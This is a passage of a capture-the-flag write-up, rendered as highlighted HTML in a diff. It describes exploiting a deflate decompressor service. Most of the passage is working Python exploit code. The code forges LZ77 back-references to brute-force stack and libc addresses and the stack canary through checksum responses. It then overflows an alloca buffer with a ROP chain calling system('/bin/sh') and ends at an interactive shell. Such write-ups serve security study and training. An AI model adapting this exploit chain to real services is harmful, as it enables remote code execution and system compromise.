+<span class="n">length_bit_counts</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span>
+
+<span class="n">distance_bases</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">129</span><span class="p">,</span> <span class="mi">193</span><span class="p">,</span> <span class="mi">257</span><span class="p">,</span> <span class="mi">385</span><span class="p">,</span> <span class="mi">513</span><span class="p">,</span> <span class="mi">769</span><span class="p">,</span> <span class="mi">1025</span><span class="p">,</span> <span class="mi">1537</span><span class="p">,</span> <span class="mi">2049</span><span class="p">,</span> <span class="mi">3073</span><span class="p">,</span> <span class="mi">4097</span><span class="p">,</span> <span class="mi">6145</span><span class="p">,</span> <span class="mi">8193</span><span class="p">,</span> <span class="mi">12289</span><span class="p">,</span> <span class="mi">16385</span><span class="p">,</span> <span class="mi">24577</span><span class="p">]</span>
+<span class="n">distance_bit_counts</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">13</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">huffman_encode</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Encodes n using the fixed huffman encoding set &quot;&quot;&quot;</span>
+
+    <span class="k">if</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">n</span> <span class="o">&lt;=</span> <span class="mi">143</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nb">bin</span><span class="p">(</span><span class="mi">48</span> <span class="o">+</span> <span class="n">n</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="mi">144</span> <span class="o">&lt;=</span> <span class="n">n</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nb">bin</span><span class="p">(</span><span class="mi">400</span> <span class="o">+</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">144</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="mi">256</span> <span class="o">&lt;=</span> <span class="n">n</span> <span class="o">&lt;=</span> <span class="mi">279</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nb">bin</span><span class="p">(</span><span class="n">n</span> <span class="o">-</span> <span class="mi">256</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="mi">280</span> <span class="o">&lt;=</span> <span class="n">n</span> <span class="o">&lt;=</span> <span class="mi">287</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nb">bin</span><span class="p">(</span><span class="mi">192</span> <span class="o">+</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">280</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Invalid character for encoding: </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">forge_lz77</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">distance</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Generate an LZ77 escape sequence with a given length and distace &quot;&quot;&quot;</span>
+
+    <span class="n">i</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">length_bases</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
+
+    <span class="c1"># Find base for length</span>
+    <span class="k">while</span> <span class="n">length_bases</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">length</span><span class="p">:</span>
+        <span class="n">i</span> <span class="o">-=</span> <span class="mi">1</span>
+
+    <span class="c1"># Encode length code</span>
+    <span class="n">length_escape</span> <span class="o">=</span> <span class="n">huffman_encode</span><span class="p">(</span><span class="mi">257</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+
+    <span class="c1"># Get the corresponding bit length</span>
+    <span class="n">length_bit_count</span> <span class="o">=</span> <span class="n">length_bit_counts</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+    <span class="n">length_bits</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+
+    <span class="c1"># If not 0, calculate length bits</span>
+    <span class="k">if</span> <span class="n">length_bit_count</span><span class="p">:</span>
+        <span class="n">length_diff</span> <span class="o">=</span> <span class="n">length</span> <span class="o">-</span> <span class="n">length_bases</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+        <span class="n">length_bits</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">length_diff</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">length_bit_count</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">)</span>
+
+    <span class="n">i</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">distance_bases</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
+
+    <span class="c1"># Find base for distance</span>
+    <span class="k">while</span> <span class="n">distance_bases</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">distance</span><span class="p">:</span>
+        <span class="n">i</span> <span class="o">-=</span> <span class="mi">1</span>
+
+    <span class="c1"># Get distance code</span>
+    <span class="n">distance_code</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">i</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">)</span>
+
+    <span class="c1"># Get the corresponding bit length</span>
+    <span class="n">distance_bit_count</span> <span class="o">=</span> <span class="n">distance_bit_counts</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+    <span class="n">distance_bits</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+
+    <span class="c1"># If not 0, calculate distance bits</span>
+    <span class="k">if</span> <span class="n">distance_bit_count</span><span class="p">:</span>
+        <span class="n">distance_diff</span> <span class="o">=</span> <span class="n">distance</span> <span class="o">-</span> <span class="n">distance_bases</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+        <span class="n">distance_bits</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">distance_diff</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">distance_bit_count</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">)</span>
+
+    <span class="c1"># A bit confusing, since bits are actually little endian, in contrast to the codes</span>
+    <span class="k">return</span> <span class="n">length_escape</span> <span class="o">+</span> <span class="n">reverse_string</span><span class="p">(</span><span class="n">length_bits</span><span class="p">)</span> <span class="o">+</span> <span class="n">distance_code</span> <span class="o">+</span> <span class="n">reverse_string</span><span class="p">(</span><span class="n">distance_bits</span><span class="p">)</span>
+</code></pre></div>
+
+<p>As I mentioned earlier, the program will not save the file, unless the input passes the checksum verification. And since we can't know the checksum without knowing the data, we must somehow figure out what the data. To do this, we can simply use brute force.</p>
+<p><img alt="" src="bruteforce.png" /></p>
+<p>Since the minimum copy length is 3, we can simply point two bytes before the desired pointer. We then iterate through all possible values for the last byte. When our checksum becomes valid, we know that we have found the hidden value. Afterwards, we simply increment our pointer by one and do the same thing again, until we have the whole pointer.</p>
+<p>Based on this idea, I wrote the following code to leak a stack and a libc pointer:</p>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">bits_to_bytes</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Converts an 8 bit aligned bit string to bytearray &quot;&quot;&quot;</span>
+
+    <span class="k">return</span> <span class="nb">bytearray</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span> <span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="n">base</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="mi">8</span><span class="p">)))</span>
+
+<span class="k">def</span> <span class="nf">reverse_endianess</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Reverses the endianness of a 8 bit aligned bit string &quot;&quot;&quot;</span>
+
+    <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">reversed</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span> <span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="mi">8</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">get_checksum</span><span class="p">(</span><span class="n">plt</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Returns 4 byte padded checksum for the given plaintext &quot;&quot;&quot;</span>
+
+    <span class="k">return</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">adler32</span><span class="p">(</span><span class="n">plt</span><span class="p">))</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">send_file</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Helper function to send a file to the server &quot;&quot;&quot;</span>
+
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Quit</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;filename&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;test&quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;plox&quot;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">try_byte</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Try byte for checksum messages &quot;&quot;&quot;</span>
+
+    <span class="n">send_file</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">0.1</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">res</span> <span class="ow">and</span> <span class="sa">b</span><span class="s2">&quot;checksum&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span>
+
+<span class="k">def</span> <span class="nf">brute_byte</span><span class="p">(</span><span class="n">known_plain</span><span class="p">,</span> <span class="n">raw_payload</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Brute force a single byte with checksum &quot;&quot;&quot;</span>
+
+    <span class="n">header</span> <span class="o">=</span> <span class="n">compress</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;test&quot;</span><span class="p">)[:</span><span class="mi">2</span><span class="p">]</span>
+
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
+        <span class="n">full_plaintext</span> <span class="o">=</span> <span class="n">known_plain</span> <span class="o">+</span> <span class="nb">bytearray</span><span class="p">((</span><span class="n">char</span><span class="p">,</span> <span class="p">))</span>
+        <span class="n">check</span> <span class="o">=</span> <span class="n">get_checksum</span><span class="p">(</span><span class="n">full_plaintext</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">header</span> <span class="o">+</span> <span class="n">raw_payload</span> <span class="o">+</span> <span class="n">check</span> 
+
+        <span class="k">if</span> <span class="n">try_byte</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+            <span class="k">return</span> <span class="n">char</span>
+
+<span class="k">def</span> <span class="nf">brute_qword</span><span class="p">(</span><span class="n">start_offset</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Brute force a qword given an offset &quot;&quot;&quot;</span>
+
+    <span class="n">leak</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">((</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+        <span class="n">bits</span> <span class="o">=</span> <span class="s2">&quot;110&quot;</span> <span class="o">+</span> <span class="n">forge_lz77</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">start_offset</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;0&quot;</span> <span class="o">*</span> <span class="mi">8</span>
+        <span class="n">bits</span> <span class="o">+=</span> <span class="s2">&quot;0&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">bits</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span><span class="p">))</span>
+        <span class="n">bits</span> <span class="o">=</span> <span class="n">reverse_endianess</span><span class="p">(</span><span class="n">bits</span><span class="p">)</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">bits_to_bytes</span><span class="p">(</span><span class="n">bits</span><span class="p">)</span>
+
+        <span class="n">val</span> <span class="o">=</span> <span class="n">brute_byte</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">:],</span> <span class="n">data</span><span class="p">)</span>
+        <span class="n">leak</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">val</span> <span class="k">if</span> <span class="n">val</span> <span class="k">else</span> <span class="mi">0</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">leak</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span>
+
+<span class="n">conn</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+
+<span class="c1"># Select namespace</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;pwn&quot;</span><span class="p">)</span>
+
+<span class="c1"># Brute force a stack address with out of bounds LZ77 and checksum</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">brute_qword</span><span class="p">(</span><span class="mi">320</span><span class="p">)</span>  <span class="c1"># Leak value at offset 322</span>
+<span class="n">stack</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x228</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;stack @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="c1"># Brute force a libc address with out of bounds LZ77 and checksum</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">brute_qword</span><span class="p">(</span><span class="mi">208</span><span class="p">)</span>
+<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x1ce9e0</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;libc @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>Each sequence is prefixed with "110", indicating last block and fixed Huffman. Additionally, they are also padded with an extra null byte, since that seems to be required.</p>
+<h3>Leaking the canary</h3>
+<p>One thing I haven't mentioned yet is the canary. In fact, we aren't actually able to leak it using the previously described method. The canary doesn't appear above the buffer on the stack, since all down-stream functions are libc functions. At the same time, overlap copying prevents us from actually copying beyond the buffer.</p>
+<p>We will have to use a different method. One might notice, that since <code>alloca</code> always allocates upwards, the buffer we operate on is always above the remaining variables. This is a prime example of why you should NOT use <code>alloca</code> for user controlled buffers; instead of needing to know the canary, an attacker can simply modify variables and pointers within the stack frame.</p>
+<p>Most notably, the <code>buffer</code> is an easy target. If we point <code>buffer</code> into the canary, while also modifying <code>curr_len</code> to 1, we can brute force a single byte of the canary, almost like the previous method. The following code does just that:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">known</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
+
+<span class="c1"># Brute force the canary with checksum</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span>  <span class="c1"># Preserve pointers to avoid segfaults</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span>  <span class="c1"># Address to write length to return</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span>  <span class="c1"># Address to write buffer to return</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># File pointer, not used further</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x9000000000</span> <span class="o">+</span> <span class="mh">0xffffff11</span><span class="p">)</span>  <span class="c1"># max_len and curr_len</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># Last block to 1</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">5</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">)</span>  <span class="c1"># Length of block, wraps curr_len to 1</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">-</span> <span class="mh">0x80</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>  <span class="c1"># buffer pointer into canary</span>
+
+        <span class="n">curr</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">((</span><span class="n">char</span><span class="p">,</span> <span class="p">))</span>  <span class="c1"># Since length is 1, we brute force one character</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">gen_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>  <span class="c1"># Generate overflow payload</span>
+
+        <span class="c1"># We now overwrite the checksum with a new checksum</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="n">get_checksum</span><span class="p">(</span><span class="n">curr</span><span class="p">)</span>
+
+        <span class="c1"># Wait for response</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">0.1</span><span class="p">)</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">res</span><span class="p">:</span>
+            <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">()</span>  <span class="c1"># This helped mitigate some weird issues</span>
+
+        <span class="n">send_file</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+        <span class="c1"># If the checksum is valid, add the byte to known</span>
+        <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">0.1</span><span class="p">)</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">0.1</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">res</span> <span class="ow">and</span> <span class="sa">b</span><span class="s2">&quot;checksum&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+            <span class="n">known</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">char</span><span class="p">)</span>
+            <span class="k">break</span>
+    <span class="k">else</span><span class="p">:</span>
+
+        <span class="c1"># Yeah...</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;FUUUUCK&quot;</span><span class="p">)</span>
+
+<span class="k">return</span> <span class="n">known</span>
+
+<span class="n">canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">known</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;canary = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>Notice that we set <code>curr_len</code> to such a value, that it will overflow to 1 after adding the block length. This is done to preserve the file structure, as it would otherwise go out of sync.</p>
+<h3>Dropping a shell</h3>
+<p>Dropping a shell is as simple as it gets. We use the very same overflow described earlier to call <code>system("/bin/sh")</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># Final payload comming up, only necessary values present</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span>  <span class="c1"># Return length address</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span>  <span class="c1"># Return buffer address</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># Last block, must be true</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">10</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">-</span> <span class="mh">0x80</span><span class="p">)</span>  <span class="c1"># Buffer pointer, must be valid</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>  <span class="c1"># Weird values after canary</span>
+
+<span class="c1"># Main show, rop chain to system</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x27765</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x270e2</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">)</span>
+
+<span class="c1"># Generate overflow payload</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">gen_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">send_file</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+
+<hr />
+<h2>Solution</h2>
